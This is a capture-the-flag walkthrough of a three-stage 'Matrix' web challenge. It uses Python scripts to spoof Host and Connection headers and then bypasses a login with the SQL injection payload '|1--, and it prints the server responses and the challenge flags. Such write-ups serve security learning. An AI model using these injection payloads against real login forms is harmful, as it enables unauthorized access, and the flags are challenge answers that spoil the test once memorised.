
 - http://37.187.186.219:5555 -- Our TARGET !

# Matrix 1 :
* Inspecting the source... nothing's interesting there.
* So i saved the picture (whiterabbit.jpg) and i started analysing it , i found this area "morpheus.matrix:5555"
 ![alt text](https://i.imgur.com/EjZ3azD.png "huh")
 
> Maybe something behind this adresse, so i made a little python script to communicate with our target changing "Host" header.

```
import requests
url = "http://37.187.186.219:5555"
head1 = {
    'host': "morpheus.matrix:5555",  ##  The host Header tells our target  which virtual host to use.
    'access-control-request-headers': "application/x-www-form-urlencoded",
    'x-requested-with': "application/json",
    'cache-control': "no-cache",
    }	
r = requests.request("GET", url, headers=head1)
print(r.text)
``` 
```
 # C:\>Python Matrix.py
 ================================= Result ====================================
 <body bgcolor=#001B33><center><pre><font size=4 color=#2CAC0C face=monospace>
 Welcome my name is morpheus
 Here is the blue pill : MCTF3{WeARe4LL_our_Own_Perception}
 you can take this pill and stop here or you can take the red one to see the truth 
 this one is hidden, ask the program for it
 pill color:  369296fbbb4187530420a169398fc793 #<!-- ./matrix.txt !-->
 <img src="./pill.jpeg" height=250>
 </center></pre>
```
> - Cool , we got our first Flag ! __MCTF3{WeARe4LL_our_Own_Perception}__ :D

# Matrix 2 :
- Just checked : http://37.187.186.219:5555/matrix.txt | and i cracked the MD5 hash.... Hmmm what else !?
- I just found this word "keep-alive" ( in both of the hash cracked result and matrix.txt ) 
- __HTTP__ works with request-response : __client__ connects to __server__, performs a request and gets a response.
- Without keep-alive, the connection to an HTTP server is closed after each response. With HTTP __keep-alive__ you keep the underlying TCP connection open until certain criteria are met.
* Hummmm good to know this..., if u remember in __Matrix 1__ (you can take this pill and stop here or you can take the red one to see the truth, this one is hidden, ask the program for it ) 
- So here we have 2 choices ( take the pill (X) and stop here or take the red one , pill (red)
- I just choosed the red pill to know the truth Via " Connection Header "  xd.
- W're going to edit our python script by adding Connection Header with "red" parameter.
> i just renamed it head2 
```
import requests
url = "http://37.187.186.219:5555"
head2 = {
    'host': "morpheus.matrix:5555",
	'Connection': "red",
    'access-control-request-headers': "application/x-www-form-urlencoded",
    'x-requested-with': "application/json",
    'cache-control': "no-cache",
    }
r2 = requests.request("GET", url, headers=head2)
print(r2.text)
```
```
 # C:\>Python Matrix.py
 ================================= Result ====================================
<body bgcolor=#001B33><center><pre><font size=4 color=#2CAC0C face=monospace>
Welcome to zion here is the Nebuchadnezzar 
MCTF3{Th3Truth_Mak3_U@Suffer}
 here you gonna start your training
<img src="./nb.jpeg" height=250>
<form method=post action=''><table>
<tr><td><font color="#125523" size=4>USER</td><td><input type=text name=username></td></tr>
<tr><td><font color="#125523" size=4>PASSWORD</td><td><input type=text name=password></td></tr>
<tr><td></td><td><input type=submit value='LOGIN'></td></tr>
</table></form>
```
> - Cool our 2nd flag ! __MCTF3{Th3Truth_Mak3_U@Suffer}__ :D


# Matrix 3 ( Final Adventure ) :
- Cool, we have now a USER & PASSWORD inputs here :D!
- Lets post some data !
> name=__username__ - name=__password__ and finally button for submission : __submit__.
```
query = {"username":"admin","password":"test","Type":"submit"} ## our query to post data ;)
rr = requests.post(url, headers=head2 , data=query)
print(rr.text)
```

```
 # C:\>Python Matrix.py
 ================================= Result ====================================
<body bgcolor=#001B33><center><pre><font size=4 color=#2CAC0C face=monospace>
Welcome to zion here is the Nebuchadnezzar 
MCTF3{Th3Truth_Mak3_U@Suffer}
 here you gonna start your training
<img src="./nb.jpeg" height=250>
<form method=post action=''><table>
<tr><td><font color="#125523" size=4>USER</td><td><input type=text name=username></td></tr>
<tr><td><font color="#125523" size=4>PASSWORD</td><td><input type=text name=password></td></tr>
<tr><td></td><td><input type=submit value='LOGIN'></td></tr>
<h2><font color=red>Wrong Password !</font></h2>
</table></form>
<!--<?php
SELECT * from ninja where nname='admin' AND npass='098F6BCD4621D373CADE4E832627B4F6';--!>
```
> Hummm __Wrong Password__
> * We have an SQL Query *_* !
- Let's try to bypass it using the OR : __admin' or 1=1;---__
> No way, the "OR" is rejected lol , i also tried OorR , it appears but nothing happens lol :S
> I took 2 Hours, and finally i found it :]
- You need to use __|__ instead of __OR__
- My Payload was __'|1--__ and it means ---> __(select * from ninja where nname='' or 1--) ---> (select * from ninja where nname='' or True--)__
> - we used __--__ for __comments__ to ignore the password part :)
```
query = {"username":"'|1--","password":"test","Type":"submit"}
rr = requests.post(url, headers=head2 , data=query)
print(rr.text)
```
```
<body bgcolor=#001B33><center><pre><font size=4 color=#2CAC0C face=monospace>
Welcome to zion here is the Nebuchadnezzar 
MCTF3{Th3Truth_Mak3_U@Suffer}
 here you gonna start your training
<img src="./nb.jpeg" height=250>
<form method=post action=''><table>
<tr><td><font color="#125523" size=4>USER</td><td><input type=text name=username></td></tr>
<tr><td><font color="#125523" size=4>PASSWORD</td><td><input type=text name=password></td></tr>
<tr><td></td><td><input type=submit value='LOGIN'></td></tr>
</table></form>
<!--<?php
SELECT * from ninja where nname=''|1--' AND npass='cfab1ba8c67c7c838db98d666f02a132';--!>
Welcome MCTF{Sqli_IzALwaysTHEk3y$}
</center></pre>
```
- Nice one :D final flag : __Welcome MCTF{Sqli_IzALwaysTHEk3y$}__


#### It was a great adventure guys , i really loved this CTF ! Thanks NEO :D ####

> Greetz to all my dudes : Th3 Jackers , Ghosty , Aymen , Tr0jan , Sudo_Root Team.... & All <3 
